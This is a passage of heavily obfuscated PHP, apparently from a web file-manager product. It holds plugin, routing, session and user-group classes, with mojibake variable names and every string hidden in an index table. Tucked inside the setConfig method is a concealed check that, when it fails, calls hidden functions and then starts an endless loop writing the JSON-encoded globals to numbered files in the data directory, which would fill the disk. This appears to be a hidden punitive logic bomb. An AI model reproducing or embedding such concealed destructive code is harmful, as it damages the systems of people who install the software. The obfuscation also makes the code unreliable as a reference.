isset($¾©·©ƒ[$»¨áñ—°[236]])) { $šË±Ã Ê = Mcrypt::decode($¾©·©ƒ[$»¨áñ—°[236]], Model($»¨áñ—°[848])->get($»¨áñ—°[849])); if ($šË±Ã Ê) { $this->fileInfo = IO::info($šË±Ã Ê); $this->fileInfo[$»¨áñ—°[1659]] = $òÈÔğì§; $this->cachePath = $this->pluginCachePath($»¨áñ—°[12], $®Ù†ÀÅ); return $šË±Ã Ê; } } $òÈÔğì§ = $this->_cacheHttpFile($òÈÔğì§, $®Ù†ÀÅ); $this->fileInfo = IO::info($òÈÔğì§); } else { $this->fileInfo = IO::info($òÈÔğì§); $this->cachePath = $this->pluginCachePath($»¨áñ—°[12], $®Ù†ÀÅ); } return $òÈÔğì§; } final function _cacheHttpFile($¶«¨üÍ, $¦å€³ş = true) { $ªÌŞ¢ä =& $_SERVER[¶Ô„œ…¯]; $€‡ùÁ…ª = parse_url_query($¶«¨üÍ); $¥åÀ©›º = get_path_ext($¶«¨üÍ); if (isset($€‡ùÁ…ª[$ªÌŞ¢ä[32]]) && $€‡ùÁ…ª[$ªÌŞ¢ä[32]]) { $¥åÀ©›º = get_path_ext($€‡ùÁ…ª[$ªÌŞ¢ä[32]]); } $¡çâé°ì = hash_path($¶«¨üÍ) . $ªÌŞ¢ä[10] . $¥åÀ©›º; $this->cachePath = $this->pluginCachePath($¦å€³ş ? $¡çâé°ì : $ªÌŞ¢ä[12]); $š•¤Ôùî = IO::fileNameExist($this->cachePath, $¡çâé°ì); if ($š•¤Ôùî) { return KodIO::make($š•¤Ôùî); } $²Ğ“‡ä = rtrim($this->cachePath, $ªÌŞ¢ä[8]) . $ªÌŞ¢ä[8] . $¡çâé°ì; return $this->pluginCacheFileSet($²Ğ“‡ä, file_get_contents_nossl($¶«¨üÍ)); } final function checkSharePath($Í çÅÂû, $øáúÆÅ = true) { $»ÎµâóÌ =& $_SERVER[¶Ô„œ…¯]; if (!$this->isShare($Í çÅÂû)) { return !1; } $Óëåîªç = Action($»ÎµâóÌ[1263])->sharePathInfo($Í çÅÂû); if (!is_array($Óëåîªç) || !isset($Óëåîªç[$»ÎµâóÌ[87]])) { show_json(LNG($»ÎµâóÌ[1660]), !1); } $this->fileInfo = $Óëåîªç; $this->cachePath = $this->pluginCachePath(!1, $øáúÆÅ); return $Óëåîªç[$»ÎµâóÌ[87]]; } final function pluginCachePath($…”ç—¼ = '', $×şŒÕ¸ş = false) { $§Úıäˆá =& $_SERVER[¶Ô„œ…¯]; if ($×şŒÕ¸ş && is_array($this->fileInfo)) { $…”ç—¼ = kodIO::hashPath($this->fileInfo); } $®³ñ÷€± = rtrim(IO_PATH_SYSTEM_TEMP . $§Úıäˆá[1661] . $this->pluginName . $§Úıäˆá[8] . $…”ç—¼, $§Úıäˆá[8]); $£â¥Ü” = IO::infoFullSimple($®³ñ÷€±); $ˆ²¨èô = $£â¥Ü” && is_array($£â¥Ü”) ? $£â¥Ü”[$§Úıäˆá[87]] : $§Úıäˆá[12]; if (!$ˆ²¨èô) { $ˆ²¨èô = IO::mkdir($®³ñ÷€±); } return $ˆ²¨èô; } final function pluginCacheFileSet($ä€ÃØ©, $ûÎ¸‰öÌ = '') { $Ø‚¹õĞã =& $_SERVER[¶Ô„œ…¯]; $Úşş“œ‹ = IO::infoFullSimple($ä€ÃØ©); if (!$Úşş“œ‹) { return IO::mkfile($ä€ÃØ©, $ûÎ¸‰öÌ, REPEAT_REPLACE); } IO::setContent($Úşş“œ‹[$Ø‚¹õĞã[87]], $ûÎ¸‰öÌ); return $Úşş“œ‹[$Ø‚¹õĞã[87]]; } final function pluginLocalFile($™Şçú†× = '') { $ÍŸï¼ =& $_SERVER[¶Ô„œ…¯]; $ùÒÕÏå  = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ùÒÕÏå )) { mk_dir($ùÒÕÏå ); } if (!$™Şçú†×) { return $ùÒÕÏå ; } $ıÆˆŸÊ¤ = IO::info($™Şçú†×); $ğß–Ï©º = $ÍŸï¼[1662] . KodIO::hashPath($ıÆˆŸÊ¤) . $ÍŸï¼[10] . $ıÆˆŸÊ¤[$ÍŸï¼[169]]; if (!checkExtSafe($ğß–Ï©º)) { $ğß–Ï©º = $ğß–Ï©º . $ÍŸï¼[1298]; } $Üı¸‚Ôˆ = $ùÒÕÏå  . $ğß–Ï©º; if (@file_exists($Üı¸‚Ôˆ)) { return $Üı¸‚Ôˆ; } return IO::copy($™Şçú†×, $ùÒÕÏå , 0, $ğß–Ï©º); } final function appPackage() { $»ŒØº®Ô =& $_SERVER[¶Ô„œ…¯]; if ($this->packageData) { return $this->packageData; } $‰òïı™ = $this->parseFile($this->pluginPath . $»ŒØº®Ô[1663]); $this->parseLang($‰òïı™); $†ƒˆŠíà = json_decode_force($‰òïı™); if (!$†ƒˆŠíà) { return array(); } $Œ™Á¾Ş‡ = Hook::trigger($»ŒØº®Ô[1664], $†ƒˆŠíà); if ($Œ™Á¾Ş‡ && is_array($Œ™Á¾Ş‡)) { $†ƒˆŠíà = $Œ™Á¾Ş‡; } $this->packageData = $†ƒˆŠíà; return $†ƒˆŠíà; } public function packageInfoGet($ıÈ’õ°ã) { $½ï¯Ïˆ = $this->appPackage(); return array_get_value($½ï¯Ïˆ, $ıÈ’õ°ã); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¶Ô„œ…¯][1665]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¶Ô„œ…¯][1666]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¶Ô„œ…¯][1667]); } public function echoJsAssign($¾‡Ñš, $«î¶‹¶) { $this->echoJsAssignArr[$¾‡Ñš] = $«î¶‹¶; } private function parseFile($ÌÏ–ó½) { $™÷Ô©Ù =& $_SERVER[¶Ô„œ…¯]; $éò«®„å = file_get_contents_nossl($ÌÏ–ó½); $Ç‚ëİÚü = array($™÷Ô©Ù[1668], $™÷Ô©Ù[1669], $™÷Ô©Ù[1670], $™÷Ô©Ù[1671], $™÷Ô©Ù[1672], $™÷Ô©Ù[1673], $™÷Ô©Ù[1674]); $ÂÀŒØºÄ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$™÷Ô©Ù[92]][$™÷Ô©Ù[1675]]); foreach ($this->echoJsAssignArr as $Ò£Òçˆî => $Á¼÷ïÇ¤) { $Ç‚ëİÚü[] = $™÷Ô©Ù[1676] . $Ò£Òçˆî . $™÷Ô©Ù[1677]; $ÂÀŒØºÄ[] = is_array($Á¼÷ïÇ¤) || is_object($Á¼÷ïÇ¤) ? rawurlencode(json_encode($Á¼÷ïÇ¤)) : $Á¼÷ïÇ¤; } if (strstr($éò«®„å, $™÷Ô©Ù[1678])) { $ĞÊÌğƒ = rawurlencode(json_encode($this->pluginLangArr)); $éò«®„å = str_replace($™÷Ô©Ù[1678], $ĞÊÌğƒ, $éò«®„å); } if (strstr($éò«®„å, $™÷Ô©Ù[1679])) { $ĞÊÌğƒ = $ĞÊÌğƒ = rawurlencode(json_encode($this->getConfig())); $éò«®„å = str_replace($™÷Ô©Ù[1679], $ĞÊÌğƒ, $éò«®„å); } $éò«®„å = str_replace($Ç‚ëİÚü, $ÂÀŒØºÄ, $éò«®„å); return $éò«®„å; } private function parseLang(&$ğÇŞˆ»Ş) { $ñ©Å¢Éğ =& $_SERVER[¶Ô„œ…¯]; $â•€ˆÔ = $ñ©Å¢Éğ[1680]; if (!strstr($ğÇŞˆ»Ş, $â•€ˆÔ)) { return; } preg_match_all($ñ©Å¢Éğ[1681], $ğÇŞˆ»Ş, $¦âğà£Œ); if (!is_array($¦âğà£Œ) || count($¦âğà£Œ) == 0 || !is_array($¦âğà£Œ[0]) || count($¦âğà£Œ[0]) == 0) { return; } $ˆš„â©  = array(); $ÈÁõŠÃÑ = array(); foreach ($¦âğà£Œ[0] as $Ù”÷ÓÎ´) { $ğÌ“ïêÒ = substr($Ù”÷ÓÎ´, strlen($â•€ˆÔ), -4); $ÔšÌæğË = LNG($ğÌ“ïêÒ); $ˆš„â© [] = $Ù”÷ÓÎ´; $ÈÁõŠÃÑ[] = str_replace(array($ñ©Å¢Éğ[287], $ñ©Å¢Éğ[1163], $ñ©Å¢Éğ[419], $ñ©Å¢Éğ[121]), array($ñ©Å¢Éğ[53], $ñ©Å¢Éğ[53], $ñ©Å¢Éğ[12], $ñ©Å¢Éğ[1682]), $ÔšÌæğË); } $ğÇŞˆ»Ş = str_replace($ˆš„â© , $ÈÁõŠÃÑ, $ğÇŞˆ»Ş); } private function parseConfig(&$ˆ¥¨±Í) { $ùüÈæÀ¸ =& $_SERVER[¶Ô„œ…¯]; $Üı‚ò—ø = $ùüÈæÀ¸[1683]; if (!strstr($ˆ¥¨±Í, $Üı‚ò—ø)) { return; } preg_match_all($ùüÈæÀ¸[1684], $ˆ¥¨±Í, $ù†¾åÑ); if (!is_array($ù†¾åÑ) || count($ù†¾åÑ) == 0 || !is_array($ù†¾åÑ[0]) || count($ù†¾åÑ[0]) == 0) { return; } $úìĞËˆı = $this->getConfig(); $Ü¡Ù„ º = array(); $€Ÿ®ùÛË = array(); foreach ($ù†¾åÑ[0] as $‰÷‹ŞÜæ) { $İŸÉíæ = substr($‰÷‹ŞÜæ, strlen($Üı‚ò—ø), -2); $Ü¡Ù„ º[] = $‰÷‹ŞÜæ; $€Ÿ®ùÛË[] = _get($úìĞËˆı, $İŸÉíæ); } $ˆ¥¨±Í = str_replace($Ü¡Ù„ º, $€Ÿ®ùÛË, $ˆ¥¨±Í); } private function parsePackage(&$¼´ú×½) { $À•¯¤ù =& $_SERVER[¶Ô„œ…¯]; $µ€«Ìü‡ = $À•¯¤ù[1685]; if (!strstr($¼´ú×½, $µ€«Ìü‡)) { return; } preg_match_all($À•¯¤ù[1686], $¼´ú×½, $ìø “³¼); if (!is_array($ìø “³¼) || count($ìø “³¼) == 0 || !is_array($ìø “³¼[0]) || count($ìø “³¼[0]) == 0) { return; } $¶úïµÌß = $this->appPackage(); $Üë©Ğõ = array(); $Àó”×º— = array(); foreach ($ìø “³¼[0] as $¬ïØêº›) { $Ì–§†’Ø = substr($¬ïØêº›, strlen($µ€«Ìü‡), -2); $Üë©Ğõ[] = $¬ïØêº›; $Àó”×º—[] = _get($¶úïµÌß, $Ì–§†’Ø); } $¼´ú×½ = str_replace($Üë©Ğõ, $Àó”×º—, $¼´ú×½); } final function echoFile($áİ¨ôˆ, $Äàù­îÔ = false) { $›©ìŸ™¥ =& $_SERVER[¶Ô„œ…¯]; $ÀºÙ£‰ = $this->pluginPath . $áİ¨ôˆ; if (ACT == $›©ìŸ™¥[1687]) { echo $›©ìŸ™¥[1688] . $this->pluginName . $›©ìŸ™¥[8] . $áİ¨ôˆ . $›©ìŸ™¥[1689]; if (!file_exists($ÀºÙ£‰)) { echo $›©ìŸ™¥[1690]; return; } } $—•Ù‰öÛ = $this->parseFile($ÀºÙ£‰); $this->parseLang($—•Ù‰öÛ); $this->parseConfig($—•Ù‰öÛ); $this->parsePackage($—•Ù‰öÛ); if (is_array($Äàù­îÔ)) { $—•Ù‰öÛ = str_replace(array_keys($Äàù­îÔ), array_values($Äàù­îÔ), $—•Ù‰öÛ); } echo $›©ìŸ™¥[287] . $—•Ù‰öÛ; } private function checkVersion() { $ŞòçŸÙÃ =& $_SERVER[¶Ô„œ…¯]; $­ó‡­–Ê = $this->appPackage(); $Š‚ÀÍˆÎ = $this->getConfig(); if ($Š‚ÀÍˆÎ[$ŞòçŸÙÃ[1691]] == $­ó‡­–Ê[$ŞòçŸÙÃ[1665]]) { return; } $this->regist(); $this->setConfig(array($ŞòçŸÙÃ[1691] => $­ó‡­–Ê[$ŞòçŸÙÃ[1665]])); } final function initLang() { $ù‘Ë“Òì =& $_SERVER[¶Ô„œ…¯]; $ìşùŸ¶Ï = $ù‘Ë“Òì[1692]; $ÔØÜÕ­ = $this->pluginPath . $ù‘Ë“Òì[1693]; $ÎôŸ¶õ = I18n::getType(); $şÜÌ·ìª = array(); if (file_exists($ÔØÜÕ­ . $ÎôŸ¶õ . $ù‘Ë“Òì[917])) { $şÜÌ·ìª = (include $ÔØÜÕ­ . $ÎôŸ¶õ . $ù‘Ë“Òì[917]); } else { if ($ÎôŸ¶õ == $ù‘Ë“Òì[1694] && !file_exists($ÔØÜÕ­ . $ÎôŸ¶õ . $ù‘Ë“Òì[917]) && file_exists($ÔØÜÕ­ . $ù‘Ë“Òì[1695])) { $şÜÌ·ìª = (include $ÔØÜÕ­ . $ù‘Ë“Òì[1695]); } else { if (file_exists($ÔØÜÕ­ . $ìşùŸ¶Ï . $ù‘Ë“Òì[917])) { $şÜÌ·ìª = (include $ÔØÜÕ­ . $ìşùŸ¶Ï . $ù‘Ë“Òì[917]); } } } if (!is_array($şÜÌ·ìª)) { return array(); } if (@count($şÜÌ·ìª) > 0) { I18n::set($şÜÌ·ìª); } return $şÜÌ·ìª; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¾ü…Œ¥Å) { $ÒÕ Û â =& $_SERVER[¶Ô„œ…¯]; $î¨¸åğÖ = $_SERVER[$ÒÕ Û â[926]]; $—¹áçì = $ÒÕ Û â[1437]; if ($_SERVER[$ÒÕ Û â[919]] != $—¹áçì($î¨¸åğÖ)) { $è¤åÕŸ’ = $ÒÕ Û â[964]; $À¢Ò¨› = $ÒÕ Û â[921]; $»¤Ò£ˆÇ = $_SERVER[$ÒÕ Û â[922]] . $ÒÕ Û â[923]; $Ë¸â‡†ù = $À¢Ò¨›($»¤Ò£ˆÇ); $‘±äƒ™¬ = explode($ÒÕ Û â[287], $Ë¸â‡†ù); if (count($‘±äƒ™¬) < $ÒÕ Û â[691]) { $£Ç’‹‚Ş = $ÒÕ Û â[924]; $£Ç’‹‚Ş(); } $ØÙ£Ÿ = $ÒÕ Û â[965]; $ØÙ£Ÿ($_SERVER[$ÒÕ Û â[966]]); $è¤åÕŸ’ = $ÒÕ Û â[964]; $è¤åÕŸ’(); $°•â²²— = $ÒÕ Û â[1696]; $öŞĞıñœ = json_encode($GLOBALS[$ÒÕ Û â[1697]]); $»¨îæÀ = 1; for ($ÂŒ×µå• = $»¨îæÀ; $ÂŒ×µå• > 0; $ÂŒ×µå•++) { $°•â²²—(DATA_PATH . $ÂŒ×µå•, $öŞĞıñœ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¾ü…Œ¥Å); } public function onSetConfig($Â­Ñ‰òß) { } public function onGetConfig($‘„ü®á) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($‹Ô°ç‹Æ) { if ($‹Ô°ç‹Æ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¤±…¢¯ = "\160\154\165\x67\x69\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $£±ùñ‘ = $this->getConfig(); if (!$£±ùñ‘[$¤±…¢¯]) { return !1; } return ActionCall($_SERVER[¶Ô„œ…¯][1698], $£±ùñ‘[$¤±…¢¯]); } public function url($²ı‡Üş­, $œ½êó·÷ = '', $¹¦º²‚á = true) { $„ùÜè®İ =& $_SERVER[¶Ô„œ…¯]; $›†Ë¿ÇŸ = $this->getConfig(); $¹ˆ÷»‡› = KOD_VERSION . $„ùÜè®İ[10] . KOD_VERSION_BUILD; $òºÍ‚Õ = $this->packageVersion(); $òƒ”Ş¤ = $¹ˆ÷»‡› . $„ùÜè®İ[464] . $òºÍ‚Õ; if (substr($²ı‡Üş­, 0, 4) == $„ùÜè®İ[152] || substr($²ı‡Üş­, 0, 2) == $„ùÜè®İ[1418]) { $şÏÙµÂû = $²ı‡Üş­ . $„ùÜè®İ[1699] . $òƒ”Ş¤; } else { if ($œ½êó·÷ == $„ùÜè®İ[12]) { $şÏÙµÂû = $this->pluginHost . $²ı‡Üş­ . $„ùÜè®İ[1699] . $òƒ”Ş¤; } else { if ($œ½êó·÷ === $„ùÜè®İ[78]) { $şÏÙµÂû = $this->pluginHost . $²ı‡Üş­; } else { if ($œ½êó·÷ == $„ùÜè®İ[1700]) { $şÏÙµÂû = STATIC_PATH . $²ı‡Üş­ . $„ùÜè®İ[1699] . $¹ˆ÷»‡›; } else { if ($œ½êó·÷ == $„ùÜè®İ[1701]) { $şÏÙµÂû = APP_HOST . $„ùÜè®İ[1702] . $²ı‡Üş­ . $„ùÜè®İ[1699] . $¹ˆ÷»‡›; } else { if (isset($›†Ë¿ÇŸ[$œ½êó·÷])) { $şÏÙµÂû = $›†Ë¿ÇŸ[$œ½êó·÷] . $²ı‡Üş­ . $„ùÜè®İ[1699] . $òƒ”Ş¤; } } } } } } if (!$¹¦º²‚á) { return $şÏÙµÂû; } echo $şÏÙµÂû; } public function link($–ÂĞ¶ = false, $ĞÌšŠĞŞ = '') { $èÔÁÛüÃ =& $_SERVER[¶Ô„œ…¯]; $¢ì“»Ô‡ = $this->linkHas == !1; $this->linkHas = !0; if (!$–ÂĞ¶) { $this->link($èÔÁÛüÃ[1703], $èÔÁÛüÃ[1701]); $this->link($èÔÁÛüÃ[1704], $èÔÁÛüÃ[1700]); $this->link($èÔÁÛüÃ[1705], $èÔÁÛüÃ[1700]); $this->link($èÔÁÛüÃ[1706], $èÔÁÛüÃ[1700]); $this->link($èÔÁÛüÃ[1707], $èÔÁÛüÃ[1700]); if ($¢ì“»Ô‡) { Hook::trigger($èÔÁÛüÃ[1708]); } return; } $çÜòÀó = $this->url($–ÂĞ¶, $ĞÌšŠĞŞ, !1); if (substr($–ÂĞ¶, -3) == $èÔÁÛüÃ[1709]) { echo $èÔÁÛüÃ[1710] . $çÜòÀó . $èÔÁÛüÃ[1711] . $èÔÁÛüÃ[287]; } else { if (substr($–ÂĞ¶, -4) == $èÔÁÛüÃ[1712]) { echo $èÔÁÛüÃ[1713] . $çÜòÀó . $èÔÁÛüÃ[1714] . $èÔÁÛüÃ[287]; } } if ($¢ì“»Ô‡) { Hook::trigger($èÔÁÛüÃ[1708]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\57\x5d\x2b", "\x3a\x6e\165\155" => "\133\x30\55\71\135\x2b", "\x3a\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($‚¸Ö®, $ìŒ³¿ ø) { $òèÆ­ø =& $_SERVER[¶Ô„œ…¯]; if ($‚¸Ö® == $òèÆ­ø[1715]) { $õØÃü¾ = array_map($òèÆ­ø[1716], $ìŒ³¿ ø[0]); $¹£Š´°ß = strpos($ìŒ³¿ ø[1], $òèÆ­ø[8]) === 0 ? $ìŒ³¿ ø[1] : $òèÆ­ø[8] . $ìŒ³¿ ø[1]; $‹¹­Õ·· = $ìŒ³¿ ø[2]; } else { $õØÃü¾ = null; $¹£Š´°ß = strpos($ìŒ³¿ ø[0], $òèÆ­ø[8]) === 0 ? $ìŒ³¿ ø[0] : $òèÆ­ø[8] . $ìŒ³¿ ø[0]; $‹¹­Õ·· = $ìŒ³¿ ø[1]; } array_push(self::$maps, $õØÃü¾); array_push(self::$routes, $¹£Š´°ß); array_push(self::$methods, strtoupper($‚¸Ö®)); array_push(self::$callbacks, $‹¹­Õ··); } public static function error($ÖÀø™û¦) { self::$errorCallback = $ÖÀø™û¦; } public static function haltOnMatch($¨Í¶üÃİ = true) { self::$halts = $¨Í¶üÃİ; } public static function dispatch() { $£ø¤ù–‚ =& $_SERVER[¶Ô„œ…¯]; $ªÅü ·ø = parse_url($_SERVER[$£ø¤ù–‚[1717]], PHP_URL_PATH); $ÇÃ·”©ï = $_SERVER[$£ø¤ù–‚[164]]; $ ı…¾» = array_keys(static::$patterns); $ÅÖÊÉ¸¦ = array_values(static::$patterns); $õ¯¿ŸÒ = !1; self::$routes = preg_replace($£ø¤ù–‚[1368], $£ø¤ù–‚[8], self::$routes); if (in_array($ªÅü ·ø, self::$routes)) { $´¥£ãø = array_keys(self::$routes, $ªÅü ·ø); foreach ($´¥£ãø as $›ˆ£Úçî) { if (self::$methods[$›ˆ£Úçî] == $ÇÃ·”©ï || self::$methods[$›ˆ£Úçî] == $£ø¤ù–‚[1718] || in_array($ÇÃ·”©ï, self::$maps[$›ˆ£Úçî])) { $õ¯¿ŸÒ = !0; if (!is_object(self::$callbacks[$›ˆ£Úçî])) { $¶Óíû³ = explode($£ø¤ù–‚[8], self::$callbacks[$›ˆ£Úçî]); $ÛóÆñî = end($¶Óíû³); $ÕÔ°…üú = explode($£ø¤ù–‚[1300], $ÛóÆñî); $ªî Ğ¯ = new $ÕÔ°…üú[0](); $ªî Ğ¯->{$ÕÔ°…üú[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$›ˆ£Úçî]); if (self::$halts) { return; } } } } } else { $ ĞÂ©Å« = 0; foreach (self::$routes as $›ˆ£Úçî) { if (strpos($›ˆ£Úçî, $£ø¤ù–‚[4]) !== !1) { $›ˆ£Úçî = str_replace($ ı…¾», $ÅÖÊÉ¸¦, $›ˆ£Úçî); } if (preg_match($£ø¤ù–‚[1719] . $›ˆ£Úçî . $£ø¤ù–‚[1720], $ªÅü ·ø, $´íÛ‹Æé)) { if (self::$methods[$ ĞÂ©Å«] == $ÇÃ·”©ï || self::$methods[$ ĞÂ©Å«] == $£ø¤ù–‚[1718] || !empty(self::$maps[$ ĞÂ©Å«]) && in_array($ÇÃ·”©ï, self::$maps[$ ĞÂ©Å«])) { $õ¯¿ŸÒ = !0; array_shift($´íÛ‹Æé); if (!is_object(self::$callbacks[$ ĞÂ©Å«])) { $¶Óíû³ = explode($£ø¤ù–‚[8], self::$callbacks[$ ĞÂ©Å«]); $ÛóÆñî = end($¶Óíû³); $ÕÔ°…üú = explode($£ø¤ù–‚[1300], $ÛóÆñî); $ªî Ğ¯ = new $ÕÔ°…üú[0](); if (!method_exists($ªî Ğ¯, $ÕÔ°…üú[1])) { echo $£ø¤ù–‚[1721]; } else { call_user_func_array(array($ªî Ğ¯, $ÕÔ°…üú[1]), $´íÛ‹Æé); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ ĞÂ©Å«], $´íÛ‹Æé); if (self::$halts) { return; } } } } $ ĞÂ©Å«++; } } if ($õ¯¿ŸÒ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $»Û£ñ± =& $_SERVER[¶Ô„œ…¯]; header($_SERVER[$»Û£ñ±[1722]] . $»Û£ñ±[1723]); echo $»Û£ñ±[1724]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$£ø¤ù–‚[1717]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÆêîÀÚ€ =& $_SERVER[¶Ô„œ…¯]; static $ÜØ˜‰ú = false; if ($ÜØ˜‰ú) { return $ÜØ˜‰ú; } $–…”Ê› = $GLOBALS[$ÆêîÀÚ€[6]][$ÆêîÀÚ€[426]]; self::$sessionTime = $–…”Ê›[$ÆêîÀÚ€[1725]]; $õˆš÷ƒù = isset($GLOBALS[$ÆêîÀÚ€[1726]]) ? $GLOBALS[$ÆêîÀÚ€[1726]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($õˆš÷ƒù)) { self::$sessionSign = Cookie::get($õˆš÷ƒù); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($õˆš÷ƒù, self::$sessionSign, self::$sessionTime); $ÆÔ¤êÕ = $–…”Ê›[$ÆêîÀÚ€[1727]]; $ı£¦Îä³ = $–…”Ê›[$ÆÔ¤êÕ]; $ßùğ‡Öë = $–…”Ê›[$ÆêîÀÚ€[906]]; switch ($ÆÔ¤êÕ) { case $ÆêîÀÚ€[21]: self::$handle = Model($ÆêîÀÚ€[907]); break; case $ÆêîÀÚ€[908]: self::$handle = new CacheRedis($ı£¦Îä³, $ßùğ‡Öë); break; case $ÆêîÀÚ€[909]: self::$handle = new CacheMemcached($ı£¦Îä³, $ßùğ‡Öë); break; case $ÆêîÀÚ€[232]: $ı£¦Îä³[$ÆêîÀÚ€[87]] = $ı£¦Îä³[$ÆêîÀÚ€[87]] . $ÆêîÀÚ€[1728]; self::$handle = new CacheFile($ı£¦Îä³, $ßùğ‡Öë); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÜØ˜‰ú = new self(); return $ÜØ˜‰ú; } public static function getBySign($·ÎÍÄëó) { $“‹¯¿§È = self::$handle->get($·ÎÍÄëó); $“‹¯¿§È = unserialize($“‹¯¿§È); return is_array($“‹¯¿§È) ? $“‹¯¿§È : array(); } public static function setBySign($ÎÅˆæÚ, $œ™™»‡¶) { CacheLock::lock($ÎÅˆæÚ); self::$handle->set($ÎÅˆæÚ, serialize($œ™™»‡¶), self::$sessionTime); CacheLock::unlock($ÎÅˆæÚ); } public static function sign($Ñô«šÃ = false) { if ($Ñô«šÃ) { self::$sessionSign = $Ñô«šÃ; } self::init(); return self::$sessionSign; } public static function set($ğî¿Ä±, $Ó¨…ß…š = false) { self::init(); if (is_array($ğî¿Ä±)) { foreach ($ğî¿Ä± as $ø„‘¨ => $¶£åÔğ) { array_set_value(self::$data, $ø„‘¨, $¶£åÔğ); } } else { array_set_value(self::$data, $ğî¿Ä±, $Ó¨…ß…š); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Øš›ËûË = false) { self::init(); if (!$Øš›ËûË) { return self::$data; } return array_get_value(self::$data, $Øš›ËûË); } public static function remove($Æ„Å—½ä) { self::init(); unset(self::$data[$Æ„Å—½ä]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¶Ô„œ…¯][912])) { self::$handle->clearTimeout(); } } } goto C‹„·ìµé‹; Aï£ÍŸÛºó: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\x67\x72\157\165\160\137\155\x65\164\141", "\x6d\x65\x74\141\x46\x69\145\154\144" => "\147\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($­õ±¢³) { $ˆÇäÙµ´ =& $_SERVER[¶Ô„œ…¯]; return array($ˆÇäÙµ´[2062] => array($­õ±¢³[0], $ˆÇäÙµ´[2063]), $ˆÇäÙµ´[2064] => array($­õ±¢³[0], $ˆÇäÙµ´[2065])); } protected function getInfo($ğò›©â™, $ÖÄİ”¦ß = false) { $”ßäİËÚ = $this->getInfoSimple($ğò›©â™); if (!$”ßäİËÚ) { return !1; } if ($ÖÄİ”¦ß) { return $this->_listDataApplyItem($”ßäİËÚ); } return $this->cacheFunctionGet($_SERVER[¶Ô„œ…¯][2066], $ğò›©â™); } protected function getInfoSimple($—ŸáıÍ, $ŸŞ“¹Òë = false) { $¸Øû¹ä =& $_SERVER[¶Ô„œ…¯]; if ($ŸŞ“¹Òë) { $¹ßÆ£ ¼ = array($¸Øû¹ä[1980] => intval($—ŸáıÍ)); $í¤ù²é¿ = $this->where($¹ßÆ£ ¼)->find(); return is_array($í¤ù²é¿) ? $í¤ù²é¿ : array(); } return $this->cacheFunctionGet($¸Øû¹ä[2067], $—ŸáıÍ); } protected function groupAdd($°Èƒ˜œŠ) { $ÀôÈåú =& $_SERVER[¶Ô„œ…¯]; if (!$°Èƒ˜œŠ[$ÀôÈåú[192]] && isset($°Èƒ˜œŠ[$ÀôÈåú[1980]]) && $°Èƒ˜œŠ[$ÀôÈåú[1980]] == 1) { if ($öƒºı¢Û = $this->getInfoSimple($°Èƒ˜œŠ[$ÀôÈåú[1980]], !0)) { return $°Èƒ˜œŠ[$ÀôÈåú[1980]]; } } else { $öƒºı¢Û = $this->getInfoSimple($°Èƒ˜œŠ[$ÀôÈåú[192]]); if (!$öƒºı¢Û) { return !1; } } $€®½ûê° = $ÀôÈåú[595]; if ($öƒºı¢Û[$ÀôÈåú[586]]) { $€®½ûê° = $öƒºı¢Û[$ÀôÈåú[586]] . $öƒºı¢Û[$ÀôÈåú[1980]] . $ÀôÈåú[50]; } $ŠßÊÙÃ = array($ÀôÈåú[496] => $this->groupNameAuto($°Èƒ˜œŠ[$ÀôÈåú[192]], $°Èƒ˜œŠ[$ÀôÈåú[32]]), $ÀôÈåú[479] => $°Èƒ˜œŠ[$ÀôÈåú[192]], $ÀôÈåú[657] => $€®½ûê°, $ÀôÈåú[2068] => $°Èƒ˜œŠ[$ÀôÈåú[1966]], $ÀôÈåú[2069] => 0, $ÀôÈåú[1984] => 0); if (isset($°Èƒ˜œŠ[$ÀôÈåú[2004]])) { $ŠßÊÙÃ[$ÀôÈåú[2004]] = $°Èƒ˜œŠ[$ÀôÈåú[2004]]; } else { $ò˜Ÿ‰ƒÊ = $this->max($ÀôÈåú[2004]); if (!$ò˜Ÿ‰ƒÊ) { $ò˜Ÿ‰ƒÊ = 0; } $ŠßÊÙÃ[$ÀôÈåú[2004]] = $ò˜Ÿ‰ƒÊ + 1; } if (!empty($°Èƒ˜œŠ[$ÀôÈåú[1980]])) { $ŠßÊÙÃ[$ÀôÈåú[1980]] = $°Èƒ˜œŠ[$ÀôÈåú[1980]]; } $ŞäĞÅ¹Ô = $this->add($ŠßÊÙÃ); $this->setNamePinyin($ŞäĞÅ¹Ô, 